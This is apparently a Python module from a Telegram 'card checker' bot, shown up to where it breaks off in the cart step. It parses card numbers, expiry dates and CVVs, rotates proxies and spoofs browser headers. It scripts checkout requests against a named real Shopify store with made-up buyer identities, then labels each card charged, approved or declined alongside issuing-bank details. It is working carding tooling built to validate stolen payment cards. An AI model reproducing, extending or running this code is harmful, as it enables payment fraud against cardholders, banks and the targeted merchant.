# BOT/gates/charge/shopify/shopify054.py

import json
import asyncio
import re
import time
import random
import string
import base64
import httpx
import urllib.parse
from datetime import datetime
from pyrogram import Client, filters
from pyrogram.types import Message
import html
import os
import unicodedata

# Import from helper modules
try:
    from BOT.helper.permissions import auth_and_free_restricted
except ImportError:
    def auth_and_free_restricted(func):
        async def wrapper(client, message):
            return await func(client, message)
        return wrapper

try:
    from BOT.helper.Admins import is_command_disabled, get_command_offline_message
except ImportError:
    def is_command_disabled(command_name: str) -> bool:
        return False
    def get_command_offline_message(command_name: str) -> str:
        return "Command is temporarily disabled."

try:
    from BOT.gc.credit import charge_processor
    CHARGE_PROCESSOR_AVAILABLE = True
except ImportError:
    charge_processor = None
    CHARGE_PROCESSOR_AVAILABLE = False

try:
    from TOOLS.getbin import get_bin_details
except ImportError:
    def get_bin_details(bin_number):
        return {}

# Import smart card parser from filter.py
try:
    from BOT.helper.filter import extract_cards, normalize_year
    FILTER_AVAILABLE = True
    print("✅ Smart card parser imported successfully from filter.py")
except ImportError as e:
    print(f"❌ Filter import error: {e}")
    FILTER_AVAILABLE = False
    def extract_cards(text):
        cards = []
        for line in text.splitlines():
            parts = line.replace('|', ' ').split()
            if len(parts) >= 4:
                cards.append('|'.join(parts[:4]))
        return cards, list(set(cards))
    def normalize_year(y):
        y = y.strip()
        if len(y) == 4:
            return y[-2:]
        return y

# Import proxy system functions
try:
    from BOT.tools.proxy import (
        get_proxy_for_user,
        mark_proxy_success,
        mark_proxy_failed,
        get_random_proxy,
        parse_proxy,
        test_proxy,
        PROXY_ENABLED
    )
    PROXY_SYSTEM_AVAILABLE = True
    print("✅ Proxy system imported successfully for shopify054")
except ImportError as e:
    print(f"❌ Proxy system import error in shopify054: {e}")
    PROXY_SYSTEM_AVAILABLE = False
    def get_proxy_for_user(user_id: int, strategy: str = "random"):
        return None
    def mark_proxy_success(proxy: str, response_time: float):
        pass
    def mark_proxy_failed(proxy: str):
        pass
    def get_random_proxy():
        return None
    def parse_proxy(proxy_str: str):
        return None
    def test_proxy(proxy_str: str):
        return False

# ========== DETAILED LOGGER ==========
class ShopifyLogger:
    def __init__(self, user_id=None):
        self.user_id = user_id
        self.check_id = f"SCH054-{random.randint(1000, 9999)}"
        self.start_time = None
        self.step_counter = 0
        self.logs = []

    def start_check(self, card_details):
        self.start_time = time.time()
        self.step_counter = 0
        cc = card_details.split('|')[0] if '|' in card_details else card_details
        masked_cc = cc[:6] + "******" + cc[-4:] if len(cc) > 10 else cc

        log_msg = f"""
🛒 [SHOPIFY CHARGE 0.54$]
   ├── Check ID: {self.check_id}
   ├── User ID: {self.user_id or 'N/A'}
   ├── Card: {masked_cc}
   ├── Start Time: {datetime.now().strftime('%H:%M:%S')}
   └── Target: heartofiowamarketplace.com (Saltwater Taffy x5)
        """
        self.add_log(log_msg)
        print(log_msg)
        return log_msg

    def add_log(self, message):
        timestamp = datetime.now().strftime('%H:%M:%S.%f')[:-3]
        self.logs.append(f"[{timestamp}] {message}")

    def step(self, step_num, step_name, action, details=None, status="PROCESSING"):
        self.step_counter += 1
        elapsed = time.time() - self.start_time if self.start_time else 0

        status_icons = {
            "PROCESSING": "🔄", "SUCCESS": "✅", "FAILED": "❌",
            "WARNING": "⚠️", "INFO": "ℹ️", "CAPTCHA": "🛡️",
            "DECLINED": "⛔", "HUMAN": "👤", "CLICK": "🖱️",
            "TYPE": "⌨️", "WAIT": "⏳"
        }
        status_icon = status_icons.get(status, "➡️")

        log_msg = f"{status_icon} STEP {step_num:02d}: {step_name}"
        log_msg += f"\n   ├── Action: {action}"
        log_msg += f"\n   ├── Elapsed: {elapsed:.2f}s"
        log_msg += f"\n   ├── Time: {datetime.now().strftime('%H:%M:%S')}"
        if details:
            log_msg += f"\n   └── Details: {details}"

        self.add_log(log_msg)
        print(log_msg)
        print()
        return log_msg

    def data_extracted(self, data_type, value, source=""):
        if isinstance(value, dict):
            value_str = json.dumps(value, indent=2)
            if len(value_str) > 150:
                value_str = value_str[:147] + "..."
        else:
            value_str = str(value)
            if len(value_str) > 100:
                value_str = value_str[:97] + "..."

        log_msg = f"   ├── 📊 Extracted {data_type}: {value_str}"
        if source:
            log_msg += f"\n   │   └── From: {source}"
        self.add_log(log_msg)
        print(log_msg)
        return log_msg

    def card_details_log(self, cc, mes, ano, cvv):
        masked_cc = cc[:6] + "******" + cc[-4:]
        log_msg = f"""
   ├── 💳 Card Details:
   │   ├── Number: {masked_cc}
   │   ├── Expiry: {mes}/{ano}
   │   └── CVV: {'*' * len(cvv)}
        """
        self.add_log(log_msg)
        print(log_msg)
        return log_msg

    def error_log(self, error_type, message, step=""):
        error_icons = {
            "CAPTCHA": "🛡️", "DECLINED": "💳", "FRAUD": "🚫",
            "TIMEOUT": "⏰", "CONNECTION": "🔌", "UNKNOWN": "❓",
            "PROXY": "🔧", "NO_PROXY": "🚫", "PCI": "💳",
            "CHECKOUT_TOKEN": "🎫", "PROCESSING": "⏳"
        }
        error_icon = error_icons.get(error_type, "⚠️")
        log_msg = f"{error_icon} ERROR [{error_type}]: {message}"
        if step:
            log_msg += f"\n   └── At Step: {step}"
        self.add_log(log_msg)
        print(log_msg)
        print()
        return log_msg

    def success_log(self, message, details=""):
        log_msg = f"✅ SUCCESS: {message}"
        if details:
            log_msg += f"\n   └── Details: {details}"
        self.add_log(log_msg)
        print(log_msg)
        return log_msg

    def complete_result(self, success, final_status, response_message, total_time):
        result_icon = "✅" if success else "❌"
        result_text = "APPROVED" if success else "DECLINED"

        if len(response_message) > 100:
            response_display = response_message[:97] + "..."
        else:
            response_display = response_message

        log_msg = f"""
{result_icon} [SHOPIFY CHARGE COMPLETED]
   ├── Check ID: {self.check_id}
   ├── Result: {result_text}
   ├── Final Status: {final_status}
   ├── Steps Completed: {self.step_counter}
   ├── Total Time: {total_time:.2f}s
   ├── Response: {response_display}
   └── End Time: {datetime.now().strftime('%H:%M:%S')}
        """
        summary = f"📊 SUMMARY: {result_icon} {final_status} | {total_time:.2f}s | Steps: {self.step_counter}"
        self.add_log(log_msg)
        self.add_log(summary)
        print(log_msg)
        print(summary)
        print("="*80)
        return log_msg, summary

    def get_all_logs(self):
        return "\n".join(self.logs)


# ========== UTILITY FUNCTIONS ==========
def load_users():
    try:
        with open("DATA/users.json", "r") as f:
            return json.load(f)
    except:
        return {}

def load_owner_id():
    try:
        with open("FILES/config.json", "r") as f:
            return json.load(f).get("OWNER")
    except:
        return None

def get_user_plan(user_id):
    users = load_users()
    if str(user_id) in users:
        return users[str(user_id)].get("plan", {})
    return {}

def is_user_banned(user_id):
    try:
        if not os.path.exists("DATA/banned_users.txt"):
            return False
        with open("DATA/banned_users.txt", "r") as f:
            return str(user_id) in f.read().splitlines()
    except:
        return False

def check_cooldown(user_id, command_type="so"):
    owner_id = load_owner_id()
    if str(user_id) == str(owner_id):
        return True, 0

    try:
        with open("DATA/cooldowns.json", "r") as f:
            cooldowns = json.load(f)
    except:
        cooldowns = {}

    user_key = f"{user_id}_{command_type}"
    current_time = time.time()

    if user_key in cooldowns:
        last_time = cooldowns[user_key]
        user_plan = get_user_plan(user_id)
        antispam = user_plan.get("antispam", 15) or 15

        if current_time - last_time < antispam:
            return False, antispam - (current_time - last_time)

    cooldowns[user_key] = current_time
    try:
        with open("DATA/cooldowns.json", "w") as f:
            json.dump(cooldowns, f, indent=4)
    except:
        pass

    return True, 0

def strip_all_unicode(text):
    try:
        normalized = unicodedata.normalize('NFKD', text)
        ascii_text = normalized.encode('ASCII', 'ignore').decode('ASCII')
    except:
        ascii_text = ''.join(char for char in text if ord(char) < 128)
    cleaned = re.sub(r'[^0-9a-zA-Z\|\s,\/\-]', ' ', ascii_text)
    cleaned = re.sub(r'\s+', ' ', cleaned)
    return cleaned.strip()

def extract_card_from_cleaned_text(text):
    pattern1 = r'(\d{13,16})\s*[|\s]\s*(\d{1,2})\s*[|\s]\s*(\d{2,4})\s*[|\s]\s*(\d{3,4})'
    match = re.search(pattern1, text)
    if match:
        cc, mes, ano, cvv = match.groups()
        if len(ano) == 4:
            ano = ano[-2:]
        mes = mes.zfill(2)
        return [cc, mes, ano, cvv]
    
    pattern2 = r'(\d{13,16})\s*[, ]\s*(\d{1,2})\s*[, ]\s*(\d{2,4})\s*[, ]\s*(\d{3,4})'
    match = re.search(pattern2, text)
    if match:
        cc, mes, ano, cvv = match.groups()
        if len(ano) == 4:
            ano = ano[-2:]
        mes = mes.zfill(2)
        return [cc, mes, ano, cvv]
    
    digits = re.findall(r'\d+', text)
    for i in range(len(digits) - 3):
        potential_cc = digits[i]
        potential_mes = digits[i+1]
        potential_ano = digits[i+2]
        potential_cvv = digits[i+3]
        if (13 <= len(potential_cc) <= 16 and 
            len(potential_mes) in [1, 2] and 
            len(potential_ano) in [2, 4] and 
            len(potential_cvv) in [3, 4]):
            try:
                mes_int = int(potential_mes)
                if 1 <= mes_int <= 12:
                    current_year = datetime.now().year % 100
                    if len(potential_ano) == 4:
                        ano_val = int(potential_ano) % 100
                    else:
                        ano_val = int(potential_ano)
                    if current_year - 5 <= ano_val <= current_year + 10:
                        cc = potential_cc
                        mes = potential_mes.zfill(2)
                        ano = potential_ano[-2:]
                        cvv = potential_cvv
                        return [cc, mes, ano, cvv]
            except:
                continue
    
    pattern4 = r'[Cc]ard:?\s*(\d{13,16}).*?(\d{1,2})[\/\-](\d{2,4}).*?(\d{3,4})'
    match = re.search(pattern4, text, re.IGNORECASE | re.DOTALL)
    if match:
        cc, mes, ano, cvv = match.groups()
        if len(ano) == 4:
            ano = ano[-2:]
        mes = mes.zfill(2)
        return [cc, mes, ano, cvv]
    
    pattern5 = r'(\d{13,16}).*?(\d{1,2})[\/\-](\d{2,4}).*?(\d{3,4})'
    match = re.search(pattern5, text, re.DOTALL)
    if match:
        cc, mes, ano, cvv = match.groups()
        if len(ano) == 4:
            ano = ano[-2:]
        mes = mes.zfill(2)
        return [cc, mes, ano, cvv]
    
    return None

def parse_card_input(card_input):
    cleaned_text = strip_all_unicode(card_input)
    result = extract_card_from_cleaned_text(cleaned_text)
    if result:
        return result
    
    if FILTER_AVAILABLE:
        all_cards, unique_cards = extract_cards(card_input)
        if unique_cards:
            card_parts = unique_cards[0].split('|')
            if len(card_parts) == 4:
                cc, mes, ano, cvv = card_parts
                if len(ano) == 4:
                    ano = ano[-2:]
                mes = mes.zfill(2)
                return [cc, mes, ano, cvv]
    
    if '|' in card_input:
        parts = card_input.split('|')
        if len(parts) >= 4:
            cc = re.sub(r'\D', '', parts[0])
            mes = re.sub(r'\D', '', parts[1])
            ano = re.sub(r'\D', '', parts[2])
            cvv = re.sub(r'\D', '', parts[3])
            if cc and mes and ano and cvv:
                if len(ano) == 4:
                    ano = ano[-2:]
                mes = mes.zfill(2)
                return [cc, mes, ano, cvv]
    
    return None


# ========== FORMAT RESPONSE FUNCTION ==========
def format_shopify_response(cc, mes, ano, cvv, raw_response, timet, profile, user_data, proxy_status="Dead 🚫"):
    fullcc = f"{cc}|{mes}|{ano}|{cvv}"

    try:
        user_id = str(user_data.get("user_id", "Unknown"))
    except:
        user_id = None

    try:
        with open("DATA/sites.json", "r") as f:
            sites = json.load(f)
        gateway = sites.get(user_id, {}).get("gate", "Shopify Charge 0.54$ 🍬")
    except:
        gateway = "Shopify Charge 0.54$ 🍬"

    raw_response = str(raw_response) if raw_response else "-"
    
    if "TIMEOUT" in raw_response.upper() or "PCI_ERROR" in raw_response.upper():
        status_flag = "Error❗️"
        response_display = "Try again ♻️"
    else:
        if "DECLINED - " in raw_response:
            response_display = raw_response.split("DECLINED - ")[-1]
            if ":" in response_display:
                response_display = response_display.split(":")[0].strip()
            response_display = response_display.split('\n')[0]
            if len(response_display) > 30:
                response_display = response_display[:27] + "..."
        elif "ORDER_PLACED" in raw_response.upper() or "PROCESSEDRECEIPT" in raw_response:
            response_display = "ORDER_PLACED"
        elif "APPROVED - " in raw_response:
            response_display = "APPROVED"
        elif "GENERIC_ERROR" in raw_response:
            if ":" in raw_response:
                response_display = raw_response.split(":")[0].strip()
            else:
                response_display = "GENERIC_ERROR"
        elif "PROXY_DEAD" in raw_response:
            response_display = "PROXY_DEAD"
        elif "NO_PROXY_AVAILABLE" in raw_response:
            response_display = "NO_PROXY_AVAILABLE"
        elif "CAPTCHA" in raw_response.upper():
            response_display = "CAPTCHA"
        elif "3D" in raw_response.upper() or "3DS" in raw_response.upper():
            response_display = "3D_SECURE"
        elif "INSUFFICIENT" in raw_response.upper():
            response_display = "INSUFFICIENT_FUNDS"
        elif "INVALID" in raw_response.upper():
            response_display = "INVALID_CARD"
        elif "EXPIRED" in raw_response.upper():
            response_display = "EXPIRED_CARD"
        elif "FRAUD" in raw_response.upper():
            response_display = "FRAUD"
        elif "TAX_NEW_TAX_MUST_BE_ACCEPTED" in raw_response:
            response_display = "TAX_CHANGE"
        elif "PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT" in raw_response:
            response_display = "PAYMENT_AMOUNT_ERROR"
        elif "PROCESSING_TIMEOUT" in raw_response:
            response_display = "PROCESSING_TIMEOUT"
        elif "ACTIONREQUIREDRECEIPT" in raw_response.upper():
            response_display = "3D_SECURE"
        else:
            if ":" in raw_response:
                response_display = raw_response.split(":")[0].strip()
                if len(response_display) > 30:
                    response_display = response_display[:27] + "..."
            else:
                response_display = raw_response[:30] + "..." if len(raw_response) > 30 else raw_response

        raw_response_upper = raw_response.upper()

        if "NO RECEIPT ID" in raw_response_upper:
            status_flag = "Declined ❌"
        elif any(keyword in raw_response_upper for keyword in [
            "ORDER_PLACED", "SUBMITSUCCESS", "SUCCESSFUL", "APPROVED", "RECEIPT",
            "COMPLETED", "PAYMENT_SUCCESS", "CHARGE_SUCCESS", "THANK_YOU",
            "ORDER_CONFIRMATION", "YOUR_ORDER_IS_CONFIRMED", "ORDER_CONFIRMED",
            "SHOPIFY_PAYMENTS", "SHOP_PAY", "CHARGED", "LIVE",
            "ORDER #", "PROCESSEDRECEIPT", "THANK YOU", "PAYMENT_SUCCESSFUL",
            "PROCESSINGRECEIPT", "AUTHORIZED", "YOUR ORDER IS CONFIRMED"
        ]):
            status_flag = "Charged ✅"
        elif any(keyword in raw_response_upper for keyword in [
            "CAPTCHA", "SOLVE THE CAPTCHA", "CAPTCHA_METADATA_MISSING", 
            "CAPTCHA DETECTED", "CAPTCHA_REQUIRED", "CAPTCHA_VALIDATION_FAILED", 
            "CAPTCHA_ERROR", "BOT_DETECTED", "HUMAN_VERIFICATION", "SECURITY_CHECK",
            "HCAPTCHA", "CLOUDFLARE", "ENTER PAYMENT INFORMATION AND SOLVE",
            "RECAPTCHA", "I'M NOT A ROBOT", "PLEASE VERIFY"
        ]):
            status_flag = "Captcha ⚠️"
        elif any(keyword in raw_response_upper for keyword in [
            "THERE WAS AN ISSUE PROCESSING YOUR PAYMENT", "PAYMENT ISSUE",
            "ISSUE PROCESSING", "PAYMENT ERROR", "PAYMENT PROBLEM",
            "TRY AGAIN OR USE A DIFFERENT PAYMENT METHOD", "CARD WAS DECLINED",
            "YOUR PAYMENT COULDN'T BE PROCESSED", "PAYMENT FAILED"
        ]):
            status_flag = "Declined ❌"
        elif any(keyword in raw_response_upper for keyword in [
            "INSUFFICIENT FUNDS", "INSUFFICIENT_FUNDS", "FUNDS", "NOT ENOUGH MONEY"
        ]):
            status_flag = "Declined ❌"
        elif any(keyword in raw_response_upper for keyword in [
            "INVALID CARD", "CARD IS INVALID", "CARD_INVALID", "CARD NUMBER IS INVALID"
        ]):
            status_flag = "Declined ❌"
        elif any(keyword in raw_response_upper for keyword in [
            "EXPIRED", "CARD HAS EXPIRED", "CARD_EXPIRED", "EXPIRATION DATE"
        ]):
            status_flag = "Declined ❌"
        elif any(keyword in raw_response_upper for keyword in [
            "3D", "AUTHENTICATION", "OTP", "VERIFICATION", "CVV-MATCH-OTP", 
            "3DS", "PENDING", "SECURE REQUIRED", "SECURE_CODE", "AUTH_REQUIRED",
            "3DS REQUIRED", "AUTHENTICATION_FAILED", "COMPLETEPAYMENTCHALLENGE",
            "ACTIONREQUIREDRECEIPT", "ADDITIONAL_VERIFICATION_NEEDED",
            "VERIFICATION_REQUIRED", "CARD_VERIFICATION", "AUTHENTICATE"
        ]):
            status_flag = "Approved ❎"
        elif any(keyword in raw_response_upper for keyword in [
            "INVALID CVC", "INCORRECT CVC", "CVC_INVALID", "CVV", "SECURITY CODE"
        ]):
            status_flag = "Declined ❌"
        elif any(keyword in raw_response_upper for keyword in [
            "FRAUD", "FRAUD_SUSPECTED", "SUSPECTED_FRAUD", "FRAUDULENT",
            "RISKY", "HIGH_RISK", "SECURITY_VIOLATION", "SUSPICIOUS"
        ]):
            status_flag = "Fraud ⚠️"
        elif "NO_PROXY_AVAILABLE" in raw_response_upper or "PROXY_DEAD" in raw_response_upper:
            status_flag = "Proxy Error 🚫"
        else:
            status_flag = "Declined ❌"

    bin_data = get_bin_details(cc[:6]) or {}
    bin_info = {
        "bin": bin_data.get("bin", cc[:6]),
        "country": bin_data.get("country", "Unknown"),
        "flag": bin_data.get("flag", "🏳️"),
        "vendor": bin_data.get("vendor", "Unknown"),
        "type": bin_data.get("type", "Unknown"),
        "level": bin_data.get("level", "Unknown"),
        "bank": bin_data.get("bank", "Unknown")
    }

    try:
        plan = user_data.get("plan", {}).get("plan", "Free")
        badge = user_data.get("plan", {}).get("badge", "🎭")
        first_name = user_data.get("first_name", "User")
    except:
        plan = "Free"
        badge = "🎭"
        first_name = "User"

    clean_name = re.sub(r'[↑←«~∞🏴]', '', first_name).strip()
    profile_display = f"『{badge}』{clean_name}"

    result = f"""
<b>[#Shopify Charge 0.54$] | WAYNE</b> ✦
━━━━━━━━━━━━━━━
<b>[•] Card</b>- <code>{fullcc}</code>
<b>[•] Gateway</b> - <b>Shopify Charge 0.54$</b>
<b>[•] Status</b>- <code>{status_flag}</code>
<b>[•] Response</b>- <code>{response_display}</code>
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[+] Bin</b>: <code>{bin_info['bin']}</code>  
<b>[+] Info</b>: <code>{bin_info['vendor']} - {bin_info['type']} - {bin_info['level']}</code> 
<b>[+] Bank</b>: <code>{bin_info['bank']}</code> 🏦
<b>[+] Country</b>: <code>{bin_info['country']} - [{bin_info['flag']}]</code>
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[ﾒ] Checked By</b>: {profile_display} [<code>{plan} {badge}</code>]
<b>[ϟ] Dev</b> ➺</b> <b><i>DADYY</i></b>
━━━━━━━━━━━━━━━
<b>[ﾒ] T/t</b>: <code>[{timet:.2f} 𝐬]</code> <b>|P/x:</b> [<code>{proxy_status}</code>]
"""
    return result


# ========== SHOPIFY TAFFY CHECKOUT CLASS ==========
class ShopifyTaffyCheckout:
    def __init__(self, user_id=None):
        self.user_id = user_id
        self.base_url = "https://heartofiowamarketplace.com"
        
        # Proxy management
        self.proxy_url = None
        self.proxy_status = "Dead 🚫"
        self.proxy_used = False

        self.client = None
        self.pci_client = None
        
        # Cookie jar for maintaining session cookies
        self.cookie_jar = httpx.Cookies()

        # Base headers
        self.headers = {
            'authority': 'heartofiowamarketplace.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'cache-control': 'max-age=0',
            'sec-ch-ua': '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36'
        }

        # Dynamic data storage
        self.checkout_token = None
        self.session_token = None
        self.graphql_session_token = None
        self.receipt_id = None
        self.variant_id = "51706494419260"
        self.product_id = "10017022804284"
        self.stable_id = None
        self.queue_token = None
        self._r_param = None
        
        self.proposal_id = "e65ffeb18d0b5e7cc746231c07befb63f4bc2e69c060d4067ca9115a923ae427"
        self.submit_id = "7cc51969cc21c5f45bc518e0650abe94c2ff3ffa378fb7d0b72212b44ff36470"
        self.poll_id = "42b5051ef09da17cd5cb5789121ab3adab0ca8c9ec7547a4d431bb17060e757f"
        
        self.delivery_strategy_handle = None
        self.payment_method_identifier = None

        self.logger = ShopifyLogger(user_id)

        self.first_names = ["James", "Robert", "John", "Michael", "David", "William", "Richard", 
                           "Joseph", "Thomas", "Charles", "Daniel", "Matthew", "Anthony", "Mark", 
                           "Donald", "Steven", "Paul", "Andrew", "Kenneth", "Joshua", "Kevin", 
                           "Brian", "George", "Timothy", "Ronald", "Edward", "Jason", "Jeffrey",
                           "Casey", "Mini", "Bruce", "Tony", "Steve", "Peter", "Clark"]
        self.last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", 
                          "Davis", "Rodriguez", "Martinez", "Hernandez", "Lopez", "Gonzalez", 
                          "Wilson", "Anderson", "Thomas", "Taylor", "Moore", "Jackson", "Martin", 
                          "Lee", "Perez", "Thompson", "White", "Harris", "Sanchez", "Clark", "Lang", 
                          "Trump", "Walker", "Hall", "Allen", "Young", "King"]

        self.first_name = random.choice(self.first_names)
        self.last_name = random.choice(self.last_names)
        self.full_name = f"{self.first_name} {self.last_name}"
        self.email = f"{self.first_name.lower()}{self.last_name.lower()}{random.randint(10,999)}@gmail.com"

        self.address = {
            "address1": "211 5th Street",
            "address2": "",
            "city": "West Des Moines",
            "provinceCode": "IA",
            "zip": "50265",
            "countryCode": "US"
        }
        
        self.coordinates = {
            "latitude": 41.5715412,
            "longitude": -93.7086683
        }

    async def random_delay(self, min_sec=0.3, max_sec=0.7):
        await asyncio.sleep(random.uniform(min_sec, max_sec))

    def step(self, num, name, action, details=None, status="PROCESSING"):
        return self.logger.step(num, name, action, details, status)

    def extract_checkout_token(self, url):
        patterns = [
            r'/checkouts/cn/([^/?]+)',
            r'token=([^&]+)',
            r'checkout_token=([^&]+)',
            r'checkout%5Btoken%5D=([^&]+)',
            r'checkouts/([^/?]+)',
        ]
        for pattern in patterns:
            match = re.search(pattern, url)
            if match:
                return match.group(1)
        try:
            decoded = urllib.parse.unquote(url)
            for pattern in patterns:
                match = re.search(pattern, decoded)
                if match:
                    return match.group(1)
        except:
            pass
        return None

    def extract_r_param(self, url):
        match = re.search(r'_r=([^&]+)', url)
        if match:
            return match.group(1)
        return None

    def generate_random_string(self, length=16):
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

    def generate_uuid(self):
        return f"{self.generate_random_string(8)}-{self.generate_random_string(4)}-4{self.generate_random_string(3)}-{random.choice(['8','9','a','b'])}{self.generate_random_string(3)}-{self.generate_random_string(12)}"

    def generate_timestamp(self):
        return str(int(time.time() * 1000))

    def extract_session_token_from_page(self, response):
        if hasattr(response, 'text'):
            patterns = [
                r'"sessionToken"\s*:\s*"([^"]+)"',
                r'sessionToken["\']\s*:\s*["\']([^"\']+)',
            ]
            for pattern in patterns:
                match = re.search(pattern, response.text)
                if match:
                    return match.group(1)
        return None

    def extract_delivery_strategy_from_proposal(self, response_data):
        try:
            seller_proposal = response_data.get('data', {}).get('session', {}).get('negotiate', {}).get('result', {}).get('sellerProposal', {})
            delivery = seller_proposal.get('delivery', {})
            delivery_lines = delivery.get('deliveryLines', [])
            for line in delivery_lines:
                strategies = line.get('availableDeliveryStrategies', [])
                for strategy in strategies:
                    if strategy.get('methodType') == 'PICK_UP':
                        handle = strategy.get('handle')
                        if handle:
                            self.delivery_strategy_handle = handle
                            return handle
                selected = line.get('selectedDeliveryStrategy', {})
                handle = selected.get('handle')
                if handle:
                    self.delivery_strategy_handle = handle
                    return handle
        except:
            pass
        if not self.delivery_strategy_handle:
            self.delivery_strategy_handle = "72dbf33d31957f897362ce72c88dd3c0-cd0e239ab66f3533b03acf1f2f070049"
        return self.delivery_strategy_handle

    def extract_payment_identifier_from_proposal(self, response_data):
        try:
            seller_proposal = response_data.get('data', {}).get('session', {}).get('negotiate', {}).get('result', {}).get('sellerProposal', {})
            payment = seller_proposal.get('payment', {})
            available_lines = payment.get('availablePaymentLines', [])
            for line in available_lines:
                payment_method = line.get('paymentMethod', {})
                if payment_method.get('name') == 'shopify_payments':
                    identifier = payment_method.get('paymentMethodIdentifier')
                    if identifier:
                        self.payment_method_identifier = identifier
                        return identifier
        except:
            pass
        if not self.payment_method_identifier:
            self.payment_method_identifier = "ac4db48d2c11d1054c9cc3afa8611ac4"
        return self.payment_method_identifier

    def extract_queue_token_from_response(self, response_data):
        try:
            result = response_data.get('data', {}).get('session', {}).get('negotiate', {}).get('result', {})
            queue_token = result.get('queueToken')
            if queue_token:
                self.queue_token = queue_token
                return queue_token
        except:
            pass
        return None

    async def visit_homepage(self):
        """Step 1: Visit homepage to get initial cookies"""
        self.step(1, "VISIT HOMEPAGE", "Getting initial cookies from homepage")
        
        try:
            resp = await self.client.get(
                self.base_url + "/",
                headers=self.headers,
                timeout=30
            )
            
            if resp.status_code == 200:
                self.logger.data_extracted("Cookies", "Homepage cookies received", "Homepage")
                return True, "HOMEPAGE_COOKIES"
            else:
                return False, f"Homepage failed: {resp.status_code}"
                
        except httpx.ProxyError as e:
            self.logger.error_log("PROXY", f"Proxy error on homepage: {str(e)}")
            mark_proxy_failed(self.proxy_url)
            self.proxy_status = "Dead 🚫"
            return False, "PROXY_DEAD"
        except Exception as e:
            self.logger.error_log("HOMEPAGE", str(e))
            return False, f"Homepage error: {str(e)[:50]}"

    async def visit_product_page(self):
        """Step 2: Visit product page"""
        self.step(2, "VISIT PRODUCT", "Visiting saltwater taffy product page")
        
        product_headers = {
            **self.headers,
            'referer': f'{self.base_url}/collections/all?filter.v.price.gte=0&filter.v.price.lte=1&sort_by=title-ascending',
            'sec-fetch-site': 'same-origin'
        }
        
        try:
            product_url = f"{self.base_url}/products/saltwater-taffy?_pos=11&_fid=d2870b0d0&_ss=c"
            resp = await self.client.get(
                product_url,
                headers=product_headers,
                timeout=30
            )
            
            if resp.status_code == 200:
                self.logger.data_extracted("Product Page", "Visited successfully", "Product page")
                return True, "PRODUCT_PAGE_VISITED"
            else:
                return False, f"Product page failed: {resp.status_code}"
                
        except Exception as e:
            self.logger.error_log("PRODUCT_PAGE", str(e))
            return False, f"Product page error: {str(e)[:50]}"

    async def add_to_cart(self):
        """Step 3: Add product to cart via POST"""
        self.step(3, "ADD TO CART", "Adding 5x saltwater taffy to cart")
        
        cart_add_headers = {
            'authority': 'heartofiowamarketplace.com',
            'accept': 'application/javascript',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'multipart/form-data; boundary=----WebKitFormBoundarywMWfZ6GwBHsA0iS2',
            'origin': self.base_url,
            'referer': f'{self.base_url}/products/saltwater-taffy?_pos=11&_fid=d2870b0d0&_ss=c',
            'sec-ch-ua': '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest'
        }
        
        boundary = "----WebKitFormBoundarywMWfZ6GwBHsA0iS2"
        
        form_data = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="quantity"\r\n\r\n'
            f"5\r\n"
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="form_type"\r\n\r\n'
            f"product\r\n"
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="utf8"\r\n\r\n'
            f"\xe2\x9c\x93\r\n"
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="id"\r\n\r\n'
            f"51706494419260\r\n"
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="product-id"\r\n\r\n'
            f"10017022804284\r\n"
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="section-id"\r\n\r\n'
            f"template--18989849936188__main\r\n"
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="sections"\r\n\r\n'
            f"cart-notification-product,cart-notification-button,cart-icon-bubble\r\n"
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="sections_url"\r\n\r\n'
            f"/products/saltwater-taffy\r\n"
            f"--{boundary}--\r\n"
        )
        
        try:
            resp = await self.client.post(
                f"{self.base_url}/cart/add",
                headers=cart_add_headers,
                content=form_data.encode('utf-8'),
                timeout=30
            )
            
            if resp.status_code == 200:
                self.logger.data_extracted("Cart", "Product added to cart", "Cart Add")
                return True, "CART_ADDED"
            else:
                return False, f"Cart add failed: {resp.status_code}"
                
        except Exception as e:
            self.logger.error_log("CART_ADD", str(e))
            return False, f"Cart add error: {str(e)[:50]}"

    async def go_to_cart(self):
        """Step 4: POST to /cart to get redirected to checkout"""
        self.step(4, "GO TO CART", "POST to cart for checkout redirect")
        
        cart_headers = {
            'authority': 'heartofiowamarketplace.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': self.base_url,
